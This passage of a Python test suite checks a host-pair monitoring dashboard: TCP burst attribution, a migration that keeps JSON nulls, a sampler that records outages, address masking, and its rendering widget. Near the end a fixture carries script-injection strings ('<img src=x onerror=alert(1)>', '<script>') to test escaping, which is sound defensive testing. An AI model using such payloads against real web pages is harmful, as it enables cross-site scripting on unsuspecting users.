        self.assertEqual(engine._median([1, 2, 3, 4]), 2.5)
        self.assertIsNone(engine._median([]))
        with self.subTest(control="a damaged JSON blob reads as no data, not as an exception"):
            dmg = {"pair_id": 4, "host_role": "foreign", "collected_at": 1060.0, "reachable": 1,
                   "boot_id": "b1", "tcp_counters": "{not json", "socket_states": "{also not json",
                   "source_states": "{}"}
            cur_side = engine.attribute_connection_bursts([row(1000, po=1), dmg], role="foreign")
            self.assertEqual(cur_side["skipped_counts"].get("no_counters"), 1, cur_side["summary"])
            self.assertEqual(cur_side["bursts"], [])
            # The same damaged row as the *earlier* sample: the interval is usable, but a counter missing on
            # one side yields None rather than a delta, so it cannot invent 900 connections.
            prev_side = engine.attribute_connection_bursts(
                [dict(dmg, collected_at=1000.0), row(1060, po=900)], role="foreign")
            self.assertEqual(prev_side["totals"]["new_connections"], 0, prev_side["summary"])
            self.assertEqual(prev_side["totals"]["intervals_without_counter"], 1, prev_side["summary"])
            self.assertEqual(prev_side["bursts"], [])
        # The function is pure: the same rows in, the same object out, and the caller's list untouched.
        before = json.dumps(burst, sort_keys=True)
        again = engine.attribute_connection_bursts(burst, role="foreign", now_sec=1500.0,
                                                  stale_after_sec=180.0)
        self.assertEqual(json.dumps(burst, sort_keys=True), before,
                         "attribution mutated the rows it was handed")
        self.assertEqual(json.dumps(again, sort_keys=True), json.dumps(got, sort_keys=True),
                         "two runs over one history disagreed")
        self.assertNotIn("203.0.113.20", json.dumps(got))
        self.assertEqual(re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", json.dumps(got)), [],
                         "an address shape appeared in the attribution output")
        self.assertTrue(all(isinstance(i["from"], (int, float)) and isinstance(i["at"], (int, float))
                            for i in got["intervals"]), "timestamps were not the epoch the rows carried")
        # The burst list is bounded, and `burst_count` is not. A panel that showed three of eleven bursts has
        # to be able to say it showed three of eleven; dropping the count along with the list would turn a
        # truncation into a lie about the history.
        two = ([row(1000 + i * 60, ao=6 * i, po=6 * i) for i in range(6)]
               + [row(1360, ao=6 * 5 + 240, po=6 * 5 + 40), row(1420, ao=6 * 5 + 480, po=6 * 5 + 80)])
        both = engine.attribute_connection_bursts(two, role="foreign")
        self.assertEqual(both["burst_count"], 2, both["summary"])
        self.assertEqual(len(both["bursts"]), 2)
        kept = engine.attribute_connection_bursts(two, role="foreign", max_bursts=1)
        self.assertEqual(kept["burst_count"], 2, "the count was truncated with the list")
        self.assertEqual([b["at"] for b in kept["bursts"]], [1420.0],
                         "the bounded list kept the oldest bursts, so the newest event is the one missing")
        self.assertEqual(kept["verdict"], "BURSTS(2)", kept["summary"])

    def test_101_schema_v10_round_trips_the_counter_blobs_and_keeps_their_nulls(self):
        """#70 Acceptance Test: migration 10 as storage, not as a diff.

        Three properties carry the durable half of the instrument. A JSON null inside `tcp_counters` has to
        come back as a null - flattening it to 0 is the exact collapse the nullable columns exist to prevent,
        and it happens at the serialise call rather than at the parser, so an engine-only test cannot see it.
        A row written before the migration has to read back as "not recorded", not as "the host answered",
        because the attribution turns that field into an outage claim. And `init_db()` runs on every process
        start, so the ALTER has to be guarded - an unguarded one aborts the dashboard on the second boot.
        """
        pid = 10101
        self.addCleanup(self._forget_host_rows, pid)
        self._forget_host_rows(pid)

        with storage.db_session() as conn:
            cols = storage.get_column_names(conn, "host_resources")
            info = {r["name"]: r for r in conn.execute("PRAGMA table_info(host_resources)").fetchall()}
        for new in ("tcp_counters", "socket_states", "estab_conns", "reachable"):
            self.assertIn(new, cols, f"migration 10 did not add {new}")
        # The defaults are the design, not an accident: a pre-v10 row must not inherit "the host answered"
        # or "the counters were read", so `reachable` carries no default while the blobs carry the empty
        # string the readers already treat as "nothing recorded".
        self.assertIsNone(info["reachable"]["dflt_value"],
                          "reachable gained a DEFAULT, so every row written before migration 10 now reads "
                          "as a host that answered")
        self.assertEqual(info["tcp_counters"]["dflt_value"], "''")
        self.assertEqual(info["socket_states"]["dflt_value"], "''")

        # ---- 1. A null inside a blob survives the blob.
        storage.record_host_resources({
            "pair_id": pid, "host_role": "foreign", "collected_at": 1700000000.0, "boot_id": "b1",
            "tcp_counters": {"ActiveOpens": 10, "AttemptFails": None, "ListenOverflows": None},
            "socket_states": {"ESTABLISHED": 3, "SYN_RECV": None},
            "estab_conns": 3, "reachable": 1, "source_states": {"tcp": "measured"}})
        stored = storage.host_resource_history(pid, "foreign")[0]
        self.assertIn("null", stored["tcp_counters"],
                      f"the serialiser collapsed a JSON null: {stored['tcp_counters']}")
        back = json.loads(stored["tcp_counters"])
        self.assertIsNone(back["AttemptFails"], "an unread counter came back as a number")
        self.assertEqual(back["ActiveOpens"], 10)
        self.assertIsNone(json.loads(stored["socket_states"])["SYN_RECV"])
        self.assertEqual(stored["estab_conns"], 3)
        self.assertEqual(stored["reachable"], 1)

        # An unreadable host writes 0, and 0 has to stay 0: the same helper that preserves null must not
        # turn the dark window's own witness into a NULL that reads as "column missing".
        storage.record_host_resources({"pair_id": pid, "host_role": "iran", "collected_at": 1700000001.0,
                                       "tcp_counters": {}, "socket_states": {}, "estab_conns": None,
                                       "reachable": 0})
        dark = storage.host_resource_history(pid, "iran")[0]
        self.assertEqual(dark["reachable"], 0, "a recorded outage was coerced away")
        self.assertIsNone(dark["estab_conns"], "no socket was counted, and the row now claims a number")

        # ---- 2. Masked inside the JSON, not only in the scalar columns.
        storage.record_host_resources({"pair_id": pid, "host_role": "foreign",
                                       "collected_at": 1700000002.0,
                                       "tcp_counters": {"ActiveOpens": 1, "note": "peer 203.0.113.20:443"},
                                       "socket_states": {"ESTABLISHED": 1, "note": "on 198.51.100.10"}})
        blob = json.dumps(storage.host_resource_history(pid, "foreign"), ensure_ascii=False)
        self.assertNotIn("203.0.113.20", blob)
        self.assertNotIn("198.51.100.10", blob)
        self.assertEqual(re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", blob), [],
                         "an address shape reached the stored counter blobs")

        # ---- 3. What the attribution actually reads out of a pre-migration row.
        healthy = storage.host_resource_history(pid, "foreign")[-1]
        with storage.db_session() as conn:
            conn.execute("INSERT INTO host_resources (pair_id, host_role, collected_at, load1) "
                         "VALUES (?, ?, ?, ?)", (pid, "legacy", 1699999900.0, 0.25))
        leg = storage.host_resource_history(pid, "legacy")[0]
        self.assertIsNone(leg["reachable"], "a row that predates the column read as an outage or as an "
                                           "answer, instead of as not recorded")
        self.assertEqual(leg["tcp_counters"], "")
        att = engine.attribute_connection_bursts([dict(leg), dict(healthy)], role="legacy")
        self.assertNotIn("host_unreachable", att["skipped_counts"],
                         f"a week of pre-migration history was reported as an outage: {att['summary']}")
        self.assertEqual(att["skipped_counts"], {}, att["summary"])
        self.assertEqual(len(att["intervals"]), 1, att["summary"])
        self.assertIsNone(att["intervals"][0]["new_connections"],
                          "a counter that was never read produced a delta anyway")
        self.assertEqual(att["totals"]["new_connections"], 0, att["summary"])
        self.assertEqual(att["totals"]["intervals_without_counter"], 1, att["summary"])

        # ---- 4. init_db() is idempotent, because it runs on every start.
        before = storage.get_schema_version()
        n_before = len(storage.host_resource_history(pid, "foreign"))
        storage.init_db()
        storage.init_db()
        self.assertEqual(storage.get_schema_version(), before)
        self.assertEqual(len(storage.host_resource_history(pid, "foreign")), n_before,
                         "a second init_db() dropped or duplicated the stored samples")
        again = storage.host_resource_history(pid, "foreign")[-1]
        self.assertEqual(again["collected_at"], 1700000000.0,
                         "a re-init reordered the stored history")
        self.assertIn("null", again["tcp_counters"])
        self.assertIsNone(json.loads(again["tcp_counters"])["AttemptFails"],
                          "the row that survived the re-init is not the row that was written")

    def test_102_the_capacity_sampler_records_the_dark_window_instead_of_its_absence(self):
        """#70 Acceptance Test: the thread that turns ruling 3's reboot gap into a recorded fact.

        A history is only useful across an outage if somebody keeps sampling *through* it. If the sampler
        wrote nothing while a host was coming back, the panel would show a gap, and a gap is what "nobody was
        watching" and "the host was down" both look like - which is the same class of defect as reading an
        unreachable sample as a quiet one, just moved from the parser to the scheduler.

        The failure path is also the reboot path, so the session closers are proven here rather than only in
        test_98: the second host is exactly the one that will not answer during a boot.
        """
        ir, fr = "198.51.100.10", "203.0.113.20"
        pid = storage.add_pair(name=f"sampler_{int(time.time() * 1000)}", iran_host=ir,
                               foreign_host=fr, frontend_port=443)
        self.addCleanup(storage.delete_pair, pid)
        self.addCleanup(self._forget_host_rows, pid)
        self._forget_host_rows(pid)
        # A placeholder, never a credential: the sampler refuses a pair this process cannot log into, and the
        # only thing a fixture has to prove is that a *value* is present.
        cred = {"type": "password", "value": "fixture-placeholder-not-a-credential"}
        pair = {"id": pid, "status": "ACTIVE", "iran": {"host": ir, "auth": cred},
                "foreign": {"host": fr, "auth": cred}}
        names = [n for n, _ in engine.RESOURCE_SAMPLE_COMMANDS]
        # The kernel regenerates boot_id at every boot and the parser only accepts its shape, so the recovery
        # sample has to carry a second UUID rather than a label.
        POST_BOOT = "9a8b7c6d-5e4f-3a2b-1c0d-febda9c8b7a6"

        opened, closed = [], []
        window = {"foreign_absent": False, "raise_foreign": False, "boot_id": None}

        class SealedRunner(RecordingRunner):
            def close(self):
                closed.append(self.host_role)
                return super().close()

        def factory(spec, dry_run=True, host_role=""):
            opened.append(host_role)
            if host_role == "foreign" and window["raise_foreign"]:
                raise RuntimeError(f"connection to {fr} refused")
            r = SealedRunner(host_role=host_role)
            r.state["resources"] = {"absent": list(names) if (host_role == "foreign"
                                                              and window["foreign_absent"]) else []}
            if window["boot_id"]:
                r.state["resources"]["boot_id"] = window["boot_id"] + "\n"
            return r

        real_factory, real_dry = dashboard.get_ssh_runner, dashboard.is_dry_run
        try:
            dashboard.get_ssh_runner = factory
            sampler = dashboard.CapacitySampler(pair_source=lambda: [pair], dry_run=lambda: False)

            # ---- 1. A healthy pass records one row per host, and the rows carry the counters.
            out = sampler.run_once()
            self.assertEqual([d["action"] for d in out], ["SAMPLED"], out)
            self.assertEqual(out[0]["recorded"], 2)
            self.assertEqual(out[0]["ok"], True, out[0]["summary"])
            self.assertEqual(sorted(opened), ["foreign", "iran"], "a pass opened a session for one host only")
            self.assertEqual(sorted(closed), ["foreign", "iran"], "a healthy pass left a session open")
            hist = storage.host_resource_history(pid)
            self.assertEqual(len(hist), 2, hist)
            for row in hist:
                self.assertEqual(row["reachable"], 1, f"{row['host_role']}: a host that answered is stored "
                                                      "as unreachable")
                self.assertIn("ActiveOpens", json.loads(row["tcp_counters"]))
                self.assertIn("LISTEN", json.loads(row["socket_states"]))

            # ---- 2. The dark window: every source fails, and the *failure* is what gets written.
            del opened[:]
            del closed[:]
            window["foreign_absent"] = True
            time.sleep(0.05)
            out = sampler.run_once()
            self.assertEqual(out[0]["action"], "SAMPLED", out)
            self.assertFalse(out[0]["ok"], "a host whose nine sources all failed was reported as healthy")
            self.assertEqual(out[0]["recorded"], 2, "the unreachable host was dropped instead of recorded")
            foreign = [r for r in storage.host_resource_history(pid) if r["host_role"] == "foreign"]
            self.assertEqual(foreign[0]["reachable"], 0,
                             f"the dark window wrote {foreign[0]['reachable']}: this is the row the reboot "
                             f"pentest depends on")
            self.assertEqual(json.loads(foreign[0]["tcp_counters"]), {},
                             "a host that answered nothing produced counters anyway")
            iran = [r for r in storage.host_resource_history(pid) if r["host_role"] == "iran"]
            self.assertEqual(iran[0]["reachable"], 1, "one host's outage was written onto its peer")
            self.assertEqual(sorted(closed), ["foreign", "iran"])

            # The history, as the panel sees it: the outage is named, and the interval that touches it
            # contributes nothing. Without the refusal the panel would say "no burst" - a clean night.
            att = dashboard.resource_attribution(pid, now_sec=time.time())
            fc = att["foreign"]["skipped_counts"]
            self.assertEqual(fc.get("host_unreachable", 0), 1,
                             f"the dark sample was used as a quiet one: {att['foreign']['summary']}")
            self.assertEqual(att["foreign"]["interval_count"], 0, att["foreign"]["summary"])
            self.assertEqual(att["foreign"]["verdict"], "NO_USABLE_INTERVALS",
                             "a host that was not reachable was given a verdict about its traffic")
            self.assertEqual(att["foreign"]["totals"]["new_connections"], 0)
            # The peer, sampled in the same pass through the same code, does produce an interval: so what
            # silenced `foreign` above is the outage witness, not the shape of the fixture.
            self.assertEqual(att["iran"]["interval_count"], 1, att["iran"]["summary"])
            self.assertEqual(att["iran"]["verdict"], "NO_BURSTS_UNCALIBRATED", att["iran"]["summary"])
            with self.subTest(control="the same two rows with the outage witness removed read as a quiet night"):
                # A deliberate forgery, to show what the refusal buys: the numbers themselves never object.
                hist_f = storage.host_resource_history(pid, "foreign")
                healthy = next(r for r in hist_f if r["reachable"])
                forged = [dict(r, reachable=1, tcp_counters=healthy["tcp_counters"],
                               socket_states=healthy["socket_states"]) for r in hist_f]
                q = engine.attribute_connection_bursts(forged, role="foreign")
                self.assertEqual(len(q["intervals"]), 1, q["summary"])
                self.assertEqual(q["totals"]["new_connections"], 0, q["summary"])
                self.assertEqual(q["verdict"], "NO_BURSTS_UNCALIBRATED",
                                 "the forgery did not produce the sentence the refusal prevents")

            # ---- 3. Recovery: the window ends, and the boot is never read as traffic.
            window["foreign_absent"] = False
            window["boot_id"] = POST_BOOT
            time.sleep(0.05)
            sampler.run_once()
            rec = [r for r in storage.host_resource_history(pid) if r["host_role"] == "foreign"]
            self.assertEqual(rec[0]["boot_id"], POST_BOOT,
                             "the recovered sample did not record the boot it came after")
            self.assertEqual(rec[0]["reachable"], 1, "the recovered host was still stored as unreachable")
            att = dashboard.resource_attribution(pid, now_sec=time.time())
            self.assertEqual(att["foreign"]["skipped_counts"].get("host_unreachable"), 2,
                             att["foreign"]["summary"])
            self.assertEqual(att["foreign"]["verdict"], "NO_USABLE_INTERVALS", att["foreign"]["summary"])
            time.sleep(0.05)
            sampler.run_once()
            post = dashboard.resource_attribution(pid, now_sec=time.time())
            self.assertEqual(post["foreign"]["interval_count"], 1, post["foreign"]["summary"])
            self.assertNotIn("boot_between_samples", post["foreign"]["skipped_counts"],
                             "the two post-boot samples were refused as a boot - the comparison is per "
                             "interval, not against the whole window")
            self.assertEqual(post["foreign"]["totals"]["new_connections"], 0, post["foreign"]["summary"])
            with self.subTest(control="a caller that discarded the dark rows still cannot read the strait as traffic"):
                hist_f = storage.host_resource_history(pid, "foreign")
                strait = [next(r for r in hist_f if r["reachable"] and r["boot_id"] != POST_BOOT),
                          next(r for r in hist_f if r["boot_id"] == POST_BOOT)]
                st = engine.attribute_connection_bursts(strait, role="foreign")
                self.assertEqual(st["skipped_counts"].get("boot_between_samples"), 1, st["summary"])
                self.assertEqual(st["totals"]["new_connections"], 0,
                                 "counters that restarted at boot were differenced across the reboot")

            # ---- 4. The second host will not answer at all: the window is still written, on both sides.
            window["boot_id"] = None
            window["raise_foreign"] = True
            del opened[:]
            del closed[:]
            out = sampler.run_once()
            self.assertEqual(out[0]["action"], "PARTIAL", out)
            self.assertEqual(out[0]["unreachable"], ["foreign"], out)
            self.assertNotIn(fr, out[0]["reason"], "the failure text reached the operator unmasked (#28)")
            self.assertEqual(closed, ["iran"], "the first host's session outlived the second host's failure "
                                              "(the #71 shape, on the continuously running path)")
            self.assertEqual(out[0]["recorded"], 2,
                             "a refused host was skipped instead of recorded as refused")
            after4 = {}
            for r in storage.host_resource_history(pid):   # newest first, so the first row per role is this pass
                after4.setdefault(r["host_role"], r)
            self.assertEqual(after4["foreign"]["reachable"], 0,
                             "the host that refused the connect was not stored as unreachable")
            self.assertEqual(json.loads(after4["foreign"]["tcp_counters"]), {},
                             "a refused host produced counters anyway")
            self.assertEqual(list(json.loads(after4["foreign"]["source_states"]).values()),
                             ["failed"] * len(names),
                             f"a refused host's sources were recorded as {after4['foreign']['source_states']}")
            # The reason this pass was restructured: with one try around both connects, the healthy peer lost
            # its row too, so the survivor of a reboot had a gap in its own history exactly where its traffic
            # against the down host should have been written.
            self.assertEqual(after4["iran"]["reachable"], 1,
                             "the peer of a refused host lost its sample - the pass aborted instead of partialling")
            before_rows = len(storage.host_resource_history(pid))
            with self.subTest(control="an undocumented 'no session' is ambiguous, and ambiguity writes no row"):
                # The engine cannot tell "the host refused" from "nobody opened a session for it", and only
                # the first may be written as unreachable - so the caller has to hand over the reason.
                silent = engine.collect_host_resources(None, pid, "foreign", dry_run=False)
                self.assertIsNone(silent["row"], silent["summary"])
                self.assertEqual(silent["refused"], "no_session_undocumented")
                documented = engine.collect_host_resources(None, pid, "foreign", dry_run=False,
                                                           no_session_reason=f"Connection refused to {fr}")
                self.assertEqual(documented["row"]["reachable"], 0, documented["summary"])
                self.assertNotIn(fr, json.dumps(documented["readings"]),
                                 "the recorded reason carried a routable address into the readings")
            with self.subTest(control="the outage is a transition in the audit trail, not a wall of lines"):
                logs = [a for a in storage.get_audit_logs(500)
                        if a["action"] == "CAPACITY_SAMPLER" and a["pair_id"] == pid]
                self.assertEqual(sum(1 for a in logs if a["status"] == "PARTIAL"), 1,
                                 f"{len(logs)} audit lines for four passes: the log has to name the window, "
                                 f"not copy the loop")
                self.assertNotIn(fr, " ".join(a["details"] for a in logs),
                                 "an address reached the audit log through the sampler's refusal text")

            # ---- 5. Refusals that must not open a socket at all.
            del opened[:]
            dry_sampler = dashboard.CapacitySampler(pair_source=lambda: [pair], dry_run=lambda: True)
            out = dry_sampler.run_once()
            self.assertEqual(out[0]["action"], "SKIP_DRY_RUN", out)
            self.assertEqual(opened, [], "a dry-run sampler opened host sessions")
            self.assertEqual(len(storage.host_resource_history(pid)), before_rows,
                             "the dry run recorded rows it never sampled")

            del opened[:]
            quiet_pair = dict(pair, status="DEPLOYED")
            out = dashboard.CapacitySampler(pair_source=lambda: [quiet_pair],
                                            dry_run=lambda: False).run_once()
            self.assertEqual(out[0]["action"], "SKIP_NOT_ACTIVE", out)
            self.assertEqual(opened, [], "a session was opened for a pair that is not deployed")

            # The login expiry this pentest will actually hit: the auth cache lives 15 minutes, and a boot
            # window is longer than that. A pass with no credential must be *silent in the history*, not a
            # row that blames the host for this process - the failover monitor's own rule, inherited.
            del opened[:]
            skips_before = dashboard.resource_attribution(pid, now_sec=time.time())["foreign"]["skipped_counts"]
            no_login = {"id": pid, "status": "ACTIVE", "iran": {"host": ir},
                        "foreign": {"host": fr, "auth": cred}}
            out = dashboard.CapacitySampler(pair_source=lambda: [no_login],
                                            dry_run=lambda: False).run_once()
            self.assertEqual(out[0]["action"], "SKIP_NO_CREDENTIALS", out)
            self.assertEqual(out[0]["reason"].count("iran"), 1,
                             "the refusal did not name the side it could not authenticate to")
            self.assertEqual(opened, [], "a sampler with no cached login opened host sessions anyway")
            self.assertEqual(len(storage.host_resource_history(pid)), before_rows,
                             "an expired login was written into the history as an unreachable host")
            self.assertEqual(dashboard.resource_attribution(pid, now_sec=time.time())["foreign"]
                             ["skipped_counts"], skips_before,
                             "the unauthenticated pass changed what the panel attributes to an outage")

            # ---- 6. The shipped shape, pinned where a future edit could silently undo it.
            src = inspect.getsource(dashboard.CapacitySampler.run_once)
            self.assertLess(src.index("runners[role] = get_ssh_runner"), src.index("finally:"),
                            "the opens moved back above the try, and a failed second host now strands the "
                            "first session")
            self.assertLess(src.index("finally:"), src.index("for r in (ir_runner, fr_runner)"),
                            "the closes moved out of the finally: a refused host would leave its peer's "
                            "session open for the life of the dashboard process")
            self.assertIn("no_session_reasons=refusals", src,
                          "the pass stopped telling the recorder why a host was missing, and a refused host "
                          "went back to being an absent one in the history")
            self.assertIn("record=True", src)
            self.assertNotIn("try_acquire_host_locks", src,
                             "the sampler now takes a host lock: it would stop recording during exactly the "
                             "operations the panel exists to observe")
        finally:
            dashboard.get_ssh_runner, dashboard.is_dry_run = real_factory, real_dry

    def test_103_the_attribution_reaches_both_routes_and_never_opens_a_session(self):
        """#70 Acceptance Test: the projection the panel polls, end to end.

        `dashboard.resource_attribution` is a view over stored rows, and a view is where two failure modes
        live: a second implementation that drifts from the engine's arithmetic, and a poll that reaches for a
        live session because that is what every other capacity route does. Both are checked here against
        rows written through storage, so what is asserted is what the browser would receive.
        """
        pid = storage.add_pair(name=f"attrib_{int(time.time() * 1000)}", iran_host="198.51.100.10",
                               foreign_host="203.0.113.20", frontend_port=443)
        self.addCleanup(storage.delete_pair, pid)
        self.addCleanup(self._forget_host_rows, pid)
        self._forget_host_rows(pid)
        # Relative to the real clock: `resource_attribution` defaults `now_sec` to it, and the GET /api
        # assertion below is about the freshness verdict the route would hand the browser right now.
        t0 = time.time() - 600.0

        def counters(ao, po, af=0, to=0, lo=0, est=5, syn=0):
            return {"ActiveOpens": ao, "PassiveOpens": po, "AttemptFails": af, "EstabReseds": 0,
                    "InSegs": ao, "OutSegs": po, "RetransSegs": 0, "OutRsts": 0,
                    "ListenOverflows": lo, "ListenDrops": 0, "TCPTimeouts": to,
                    "TCPSynRetrans": 0, "CurrEstab": est}, {"ESTABLISHED": est, "SYN_RECV": syn,
                                                             "TIME_WAIT": 4, "LISTEN": 2}

        def put(role, at, ao, po, reach=1, **kw):
            tcp, socks = counters(ao, po, **{k: v for k, v in kw.items() if k in
                                             ("af", "to", "lo", "est", "syn")})
            storage.record_host_resources({"pair_id": pid, "host_role": role, "collected_at": at,
                                           "boot_id": "b1", "reachable": reach,
                                           "tcp_counters": tcp if reach else {},
                                           "socket_states": socks if reach else {},
                                           "estab_conns": (kw.get("est", 5) if reach else None),
                                           "source_states": {"tcp": "measured" if reach else "failed"}})

        # A quiet host on Iran, a host that took one outbound storm on Foreign.
        for i in range(8):
            put("iran", t0 + i * 60, 20 * i, 12 * i)
            put("foreign", t0 + i * 60, 6 * i, 6 * i)
        put("foreign", t0 + 8 * 60, 6 * 7 + 240, 6 * 7 + 40, af=4, to=90, est=9, syn=5)

        att = dashboard.resource_attribution(pid, now_sec=t0 + 500)
        self.assertEqual(set(att), {"iran", "foreign"})
        self.assertEqual(att["foreign"]["verdict"], "BURSTS(1)", att["foreign"]["summary"])
        self.assertEqual(att["foreign"]["bursts"][0]["cause"], "outbound_storm")
        self.assertEqual(att["foreign"]["bursts"][0]["new_connections"], 280)
        self.assertEqual(att["iran"]["verdict"], "NO_BURSTS", att["iran"]["summary"])

        # ---- 1. The projection is a view, not a second implementation.
        direct = engine.attribute_connection_bursts(storage.host_resource_history(pid, "foreign"),
                                                    role="foreign", now_sec=t0 + 500,
                                                    stale_after_sec=engine.RESOURCE_STALE_AFTER_SEC)
        self.assertEqual(att["foreign"]["interval_count"], len(direct["intervals"]),
                         "the route counts intervals differently from the engine")
        self.assertEqual(att["foreign"]["totals"], direct["totals"])
        self.assertEqual(att["foreign"]["baseline"], direct["baseline"])
        self.assertEqual(att["foreign"]["bursts"], direct["bursts"])
        self.assertEqual(att["foreign"]["skipped"], direct["skipped"])
        self.assertNotIn("intervals", att["foreign"],
                         "the poll carries every interval object, so the capacity panel is the most "
                         "expensive thing on the page")
        self.assertLess(len(json.dumps(att, ensure_ascii=False)),
                        len(json.dumps({r: (direct if r == "foreign" else {}) for r in ("iran", "foreign")},
                                       ensure_ascii=False)),
                         "stripping intervals did not actually shrink the payload")

        # ---- 2. No session, no write, no clock of its own.
        def no_runner(*a, **k):
            raise AssertionError("resource_attribution opened an SSH session")
        real_factory = dashboard.get_ssh_runner
        try:
            dashboard.get_ssh_runner = no_runner
            again = dashboard.resource_attribution(pid, now_sec=t0 + 500)
            self.assertEqual(json.dumps(again, sort_keys=True, default=str),
                             json.dumps(att, sort_keys=True, default=str),
                             "two polls over one history disagreed")
            self.assertEqual(len(storage.host_resource_history(pid)), 17,
                             "reading the history wrote to it")
        finally:
            dashboard.get_ssh_runner = real_factory

        # ---- 3. Freshness is measured against the server clock the caller passes, not the browser's.
        self.assertFalse(att["foreign"]["stale"], att["foreign"]["summary"])
        stale = dashboard.resource_attribution(pid, now_sec=t0 + 5000)
        self.assertTrue(stale["foreign"]["stale"])
        self.assertTrue(stale["foreign"]["verdict"].endswith("_STALE"), stale["foreign"]["verdict"])

        # ---- 4. A pair with no history is described, not omitted.
        empty_pid = 10304
        self.addCleanup(self._forget_host_rows, empty_pid)
        none = dashboard.resource_attribution(empty_pid, now_sec=t0)
        self.assertEqual(set(none), {"iran", "foreign"})
        for role in ("iran", "foreign"):
            self.assertEqual(none[role]["verdict"], "NO_HISTORY", none[role]["summary"])
            self.assertEqual(none[role]["interval_count"], 0)
            self.assertIsNone(none[role]["window"], "an empty history was given a time window")

        # ---- 5. Nothing routable leaves the projection, in either direction.
        blob = json.dumps(att, ensure_ascii=False)
        self.assertEqual(re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", blob), [], blob[:200])

        # ---- 6. Both HTTP surfaces carry it, and the page wires the renderer to the field.
        body = self._get_api()["body"]
        p_row = next(p for p in body["pairs"] if p["id"] == pid)
        self.assertIn("resource_attribution", p_row,
                      "GET /api never carries the attribution, so the panel has nothing to render on load")
        self.assertEqual(set(p_row["resource_attribution"]), {"iran", "foreign"})
        self.assertEqual(p_row["resource_attribution"]["foreign"]["verdict"], "BURSTS(1)",
                         p_row["resource_attribution"]["foreign"]["summary"])
        self.assertNotIn("intervals", p_row["resource_attribution"]["foreign"],
                         "the whole-pair poll is not bounded the way the projection is")
        self.assertIn("attributionHtml(p && p.resource_attribution", dashboard.PAGE,
                      "the renderer is shipped but nothing feeds it: the panel would keep showing only the "
                      "instantaneous gauges")
        post_src = inspect.getsource(dashboard.H.do_POST)
        seg = post_src.split('self.path == "/api/resources"')[1].split("elif self.path")[0]
        self.assertIn("resource_attribution=resource_attribution(pair_id)", seg)
        self.assertLess(seg.index("record=True"), seg.index("resource_attribution=resource_attribution"),
                        "the attribution is computed before the write, so the sample an operator just asked "
                        "for is missing from the history it belongs to")
        sampler_seg = post_src.split('self.path == "/api/capacity_sampler"')[1].split("elif self.path")[0]
        for action in ("start", "stop", "once", "status"):
            self.assertIn(f'"{action}"', sampler_seg, f"the sampler route no longer offers {action}")

    def test_104_the_attribution_widget_is_executed_over_what_the_route_returns(self):
        """#70 Acceptance Test: the panel's sentences, run through node over stored rows.

        The renderer is where an unread counter becomes either a dash or a zero, where "no usable interval"
        becomes either that sentence or a row of zeros, and where the engine's `BURSTS(1)` token either
        survives for an operator comparing two rounds or gets paraphrased into something unfalsifiable. Each
        case is the real object `resource_attribution` returns, so a drift between the projection and the
        widget is a red rather than a coincidence.
        """
        node = shutil.which("node")
        if not node:
            print("    [test_104] node is not installed: the attribution widget is string-pinned only")
            return
        pid = 10404
        self.addCleanup(self._forget_host_rows, pid)
        self._forget_host_rows(pid)
        t0 = 1700000000.0

        def put(role, at, ao, po, reach=1, syn=0, est=5, boot="b1", target=pid):
            tcp = ({"ActiveOpens": ao, "PassiveOpens": po, "AttemptFails": 0, "EstabReseds": 0,
                    "InSegs": ao, "OutSegs": po, "RetransSegs": 0, "OutRsts": 0,
                    "ListenOverflows": 0, "ListenDrops": 0, "TCPTimeouts": 0,
                    "TCPSynRetrans": 0, "CurrEstab": est} if reach else {})
            socks = ({"ESTABLISHED": est, "SYN_RECV": syn, "TIME_WAIT": 4, "LISTEN": 2}
                     if reach else {})
            storage.record_host_resources({"pair_id": target, "host_role": role, "collected_at": at,
                                           "boot_id": boot, "reachable": reach, "tcp_counters": tcp,
                                           "socket_states": socks,
                                           "estab_conns": (est if reach else None),
                                           "source_states": {"tcp": "measured" if reach else "failed"}})

        for i in range(8):
            put("foreign", t0 + i * 60, 6 * i, 6 * i)
        put("foreign", t0 + 480, 6 * 7 + 240, 6 * 7 + 40, syn=5, est=9)
        burst = dashboard.resource_attribution(pid, now_sec=t0 + 500)

        # The uncalibrated host is put next to the burst in time on purpose: with two rows an earlier than
        # `RESOURCE_STALE_AFTER_SEC` the verdict would carry `_STALE` and this case would be testing the
        # staleness sentence that case 5 already tests, not the "no baseline yet" sentence. 8 + 4 new
        # connections is deliberately below the absolute floor, so the only reason no burst is reported is
        # the missing baseline.
        put("iran", t0 + 420, 100, 50)
        put("iran", t0 + 480, 108, 54)
        both = dashboard.resource_attribution(pid, now_sec=t0 + 500)
        short = {"iran": both["iran"]}
        self.assertEqual(both["iran"]["verdict"], "NO_BURSTS_UNCALIBRATED", both["iran"]["summary"])
        self.assertIn("BURSTS(1)", both["foreign"]["verdict"], both["foreign"]["summary"])

        # A second host with a three-sample window: up, silent, up again. The same code that refuses it is
        # what the panel has to render, so the case is built the way the reboot builds it.
        dark_pid = 10406
        self.addCleanup(self._forget_host_rows, dark_pid)
        put("foreign", t0, 10, 10, target=dark_pid)
        put("foreign", t0 + 60, 0, 0, reach=0, target=dark_pid)
        put("foreign", t0 + 120, 20, 20, target=dark_pid)
        dark_all = dashboard.resource_attribution(dark_pid, now_sec=t0 + 140)
        dark = {"foreign": dark_all["foreign"]}
        self.assertEqual(dark_all["foreign"]["verdict"], "NO_USABLE_INTERVALS",
                         dark_all["foreign"]["summary"])
        self.assertEqual(dark_all["foreign"]["skipped_counts"], {"host_unreachable": 2},
                         dark_all["foreign"]["summary"])

        stale = dashboard.resource_attribution(pid, now_sec=t0 + 90000)
        short_pid = 10405
        self.addCleanup(self._forget_host_rows, short_pid)
        no_history = dashboard.resource_attribution(short_pid, now_sec=t0)

        injected = {"foreign": {"verdict": "<img src=x onerror=alert(1)>", "samples": 2, "burst_count": 1,
                                "interval_count": 1, "totals": {}, "baseline": {"available": False,
                                                                                 "min_connections": "<b>"},
                                "window": {"from": t0, "to": t0 + 60}, "stale": False,
                                "skipped_counts": {"host_unreachable": 2},
                                "bursts": [{"new_connections": 30, "span_sec": 60, "rate_per_sec": None,
                                            "cause": "unknown_cause", "basis": "<script>bad</script>",
                                            "established": None, "syn_recv": None, "time_wait": None,
                                            "listen": None, "curr_estab_kernel": None, "at": None}]}}

        cases = [{"p": None, "limit": 180, "now": t0 + 500},
                 {"p": {"iran": {}, "foreign": {}}, "limit": 180, "now": t0 + 500},
                 {"p": burst, "limit": 180, "now": t0 + 500},
